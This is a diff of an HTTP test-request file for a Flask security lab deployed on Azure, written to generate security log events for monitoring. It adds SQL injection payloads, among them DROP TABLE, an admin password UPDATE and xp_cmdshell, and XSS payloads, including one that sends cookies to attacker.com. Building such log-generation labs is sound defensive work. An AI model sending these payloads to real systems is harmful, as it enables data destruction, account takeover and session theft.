@@ -1,114 +1,175 @@
+# Variables - Set your base URL here
+@base_url = https://security-lab-93823-20250618.azurewebsites.net
+
 ### Testing Flask application for security logs generation
 
 ### 1. Application health check
-GET {{base_url}}/health
+GET {{base_url}}/api/health
 Content-Type: application/json
 
-### 2. Home page
-GET {{base_url}}/
+### 2. Get security logs
+GET {{base_url}}/api/logs
 Content-Type: application/json
 
-### 3. Successful authentication (valid credentials)
-POST {{base_url}}/login
+### 3. SQL Injection Attack Test
+POST {{base_url}}/api/attack/sql
 Content-Type: application/json
 
 {
-    "username": "admin",
-    "password": "password123"
+    "query": "SELECT * FROM users WHERE id = 1 OR 1=1"
 }
 
-### 4. Failed authentication - wrong password (for alerts generation)
-POST {{base_url}}/login
+### 4. SQL Injection - Admin bypass attempt
+POST {{base_url}}/api/attack/sql
 Content-Type: application/json
 
 {
-    "username": "admin",
-    "password": "wrongpassword"
+    "query": "SELECT * FROM users WHERE username = 'admin' OR '1'='1'"
 }
 
-### 5. Failed authentication - non-existent user
-POST {{base_url}}/login
+### 5. SQL Injection - Database enumeration
+POST {{base_url}}/api/attack/sql
 Content-Type: application/json
 
 {
-    "username": "hacker",
-    "password": "123456"
+    "query": "SELECT table_name FROM information_schema.tables"
 }
 
-### 6. Failed authentication - missing password
-POST {{base_url}}/login
+### 6. SQL Injection - Union attack
+POST {{base_url}}/api/attack/sql
 Content-Type: application/json
 
 {
-    "username": "admin"
+    "query": "SELECT id FROM users UNION SELECT password FROM admin_table"
 }
 
-### 7. Failed authentication - empty request body
-POST {{base_url}}/login
-Content-Type: application/json
-
-### 8. Multiple failed attempts to simulate brute-force attack
-### (Execute these requests several times in a row to generate alerts)
-
-POST {{base_url}}/login
+### 7. XSS Attack - Basic script injection
+POST {{base_url}}/api/attack/xss
 Content-Type: application/json
 
 {
-    "username": "admin",
-    "password": "hack1"
+    "payload": "<script>alert('XSS Attack')</script>"
 }
 
-###
-POST {{base_url}}/login
+### 8. XSS Attack - Cookie theft simulation
+POST {{base_url}}/api/attack/xss
 Content-Type: application/json
 
 {
-    "username": "admin",
-    "password": "hack2"
+    "payload": "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
 }
 
-###
-POST {{base_url}}/login
+### 9. XSS Attack - DOM manipulation
+POST {{base_url}}/api/attack/xss
 Content-Type: application/json
 
 {
-    "username": "admin",
-    "password": "hack3"
+    "payload": "<img src=x onerror='document.body.innerHTML=\"<h1>Site Hacked</h1>\"'>"
 }
 
-###
-POST {{base_url}}/login
+### 10. XSS Attack - Event handler injection
+POST {{base_url}}/api/attack/xss
 Content-Type: application/json
 
 {
-    "username": "admin",
-    "password": "hack4"
+    "payload": "\" onmouseover=\"alert('XSS')\""
+}
+
+### 11. Multiple SQL Injection attempts (brute-force simulation)
+### Execute these quickly to simulate attack patterns
+
+POST {{base_url}}/api/attack/sql
+Content-Type: application/json
+
+{
+    "query": "'; DROP TABLE users; --"
 }
 
 ###
-POST {{base_url}}/login
+POST {{base_url}}/api/attack/sql
 Content-Type: application/json
 
 {
-    "username": "admin",
-    "password": "hack5"
+    "query": "admin'; UPDATE users SET password='hacked' WHERE role='admin'; --"
 }
 
 ###
-POST {{base_url}}/login
+POST {{base_url}}/api/attack/sql
 Content-Type: application/json
 
 {
-    "username": "admin",
-    "password": "hack6"
+    "query": "1' OR 1=1 LIMIT 1 OFFSET 1; --"
 }
+
+###
+POST {{base_url}}/api/attack/sql
+Content-Type: application/json
+
+{
+    "query": "' UNION SELECT username, password FROM admin_users; --"
+}
+
+###
+POST {{base_url}}/api/attack/sql
+Content-Type: application/json
+
+{
+    "query": "1'; EXEC xp_cmdshell('dir'); --"
+}
+
+### 12. Multiple XSS attempts (different vectors)
+
+POST {{base_url}}/api/attack/xss
+Content-Type: application/json
+
+{
+    "payload": "javascript:alert('XSS')"
+}
+
+###
+POST {{base_url}}/api/attack/xss
+Content-Type: application/json
+
+{
+    "payload": "<iframe src='javascript:alert(\"Iframe XSS\")'></iframe>"
+}
+
+###
+POST {{base_url}}/api/attack/xss
+Content-Type: application/json
+
+{
+    "payload": "<svg onload='alert(\"SVG XSS\")'></svg>"
+}
+
+###
+POST {{base_url}}/api/attack/xss
+Content-Type: application/json
+
+{
+    "payload": "<body onload='alert(\"Body XSS\")'>"
+}
+
+### 13. Check results after attacks
+GET {{base_url}}/api/logs
+Accept: application/json
+
+### 14. Test non-existent endpoints (for 404 logs)
+GET {{base_url}}/nonexistent
+Accept: application/json
+
+### 15. Test with malformed requests
+POST {{base_url}}/api/attack/sql
+Content-Type: application/json
+
+### 16. Clear logs after testing
+POST {{base_url}}/api/clear-logs
+Content-Type: application/json
 
 ### Usage instructions:
-### 1. Replace {{base_url}} with your application's actual URL
-###    For local testing: http://localhost:8000
-###    For Azure App Service: https://your-app-name.azurewebsites.net
-### 
-### 2. To simulate brute-force attack, execute requests from section 8
-###    quickly one after another (more than 5 times in 5 minutes)
-###
-### 3. Each request generates logs that will be visible in Azure Monitor
+### 1. The base_url is already set to your Azure deployment
+### 2. Execute tests in order, or focus on specific attack types
+### 3. Use sections 11-12 for rapid-fire attack simulation
+### 4. Check logs with request #13 to see all generated security events
+### 5. Use request #16 to clean up after testing
+### 6. All requests generate logs visible in Azure Log Analytics
